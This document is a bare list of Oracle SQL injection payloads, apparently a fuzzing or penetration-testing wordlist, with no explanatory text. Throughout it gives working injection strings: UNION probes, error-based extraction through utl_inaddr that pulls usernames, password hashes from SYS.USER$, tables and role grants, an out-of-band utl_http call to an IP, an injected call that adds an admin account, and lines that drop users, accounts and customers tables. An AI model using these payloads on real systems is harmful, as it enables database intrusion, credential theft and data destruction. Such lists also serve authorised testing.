' UNION SELECT NULL FROM DUAL--
' UNION SELECT banner,NULL,NULL FROM v$version--
' UNION SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP' --
' UNION SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = ‘AAAAAA’) = ‘AAAAAA’ --
' select banner from v$version --
' SELECT username FROM all_users ORDER BY username; --
' SELECT name FROM sys.user$; —-
' 1=2 or select banner from v$version --
' UNION SELECT NULL FROM DUAL /*
' UNION SELECT banner,NULL,NULL FROM v$version /*
' UNION SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP' /*
' UNION SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = ‘AAAAAA’) = ‘AAAAAA’ /*
' select banner from v$version /*
' 1=2 or select banner from v$version /*
' union select banner from v$version /*
' union SELECT SYS_CONTEXT(‘USERENV’,’DB_NAME’) FROM dual --
' SELECT SYS_CONTEXT(‘USERENV’,’DB_NAME’) FROM dual /*
' 1=3 or SELECT SYS_CONTEXT(‘USERENV’,’DB_NAME’) FROM dual --
' SELECT user FROM dual --
'||utl_http.request('httP://192.168.1.1/')||'
' || myappadmin.adduser('admin', 'newpass') || '
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i
' SELECT global_name FROM global_name; --
' SELECT name FROM v$database; --
' SELECT instance_name FROM v$instance; --
' SELECT * FROM session_privs; — current privs
' SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; —-
' SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; —-
' SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS; --
' SELECT SYS.DATABASE_NAME FROM DUAL; --
' UNION SELECT * FROM session_privs; —-
' UNION SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; —-
' UNION SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; —-
' UNION SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS; --
' UNION SELECT * FROM session_privs; — current privs --
'); SELECT instance_name FROM v$instance; --
'); SELECT * FROM session_privs; — current privs
'); SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; —-
'); SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; —-
'); SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS; --
'); SELECT SYS.DATABASE_NAME FROM DUAL; --
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a' --
' drop table users--
' drop table accounts--
' drop table customers--
' SELECT banner FROM v$version WHERE banner LIKE 'Oracle%' --
' SELECT banner FROM v$version WHERE banner LIKE 'TNS%' --
' SELECT version FROM v$instance --
' SELECT username FROM all_users --
' SELECT name, password from sys.user$ --
' SELECT name, spare4 from sys.user$ --
' SELECT instance_name FROM v$instance --
' SELECT global_name FROM global_name --
' SELECT SYS.DATABASE_NAME FROM DUAL --
' SELECT DISTINCT owner FROM all_tables; --
